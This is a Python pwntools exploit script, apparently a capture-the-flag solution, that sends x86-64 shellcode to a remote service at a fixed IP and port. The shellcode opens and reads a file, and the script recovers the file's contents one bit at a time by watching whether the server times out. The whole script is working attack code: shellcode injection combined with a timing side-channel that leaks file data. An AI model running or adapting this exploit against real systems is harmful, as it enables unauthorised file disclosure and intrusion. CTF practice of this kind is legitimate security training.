from pwn import *
import base64


context.arch = "amd64"

pad = '\x90\x90\x90\x90\x35\xCC\x00\x00\x00'

shellcode = '\x48\x83\xc6\x50\x35\xcc\x00\x00\x00\xff\xe6'

shellcode += '\x90'*(0x50 - len(shellcode))
cc = shellcraft.pushstr("/lincoln_burrows") + '''
mov rax , SYS_open
mov rdi , rsp
xor rsi , rsi
xor rdx , rdx
syscall 

mov rsi , rsp
mov rdi , rax
mov dl , 0x30
mov rax , SYS_read
syscall

mov dl , byte ptr [rsi + {0}]
shr dl , {1}

and dl , 1

cmp dl , 0
jz _bad

_loop:
    jmp _loop

_bad:
    ret
'''

flag = ""
idx = len(flag)

while True:
    k = ""
    paa = 0

    while (paa < 8):
        p = remote("68.183.235.104",1337)
        
        k1 = shellcode + asm(cc.format(idx , paa))
        p.sendline(k1)

        o = p.recvuntil("subprocess.TimeoutExpired:",timeout = 4)

        if("TimeoutExpired" in o):
            k = "1" + k
        else:
            k = "0" + k 

        print(o)
        print(k)
        p.close()
        paa+=1

    flag += chr(int(k,2))
    idx += 1
    print("=== FLAG : {0} === ".format(flag))
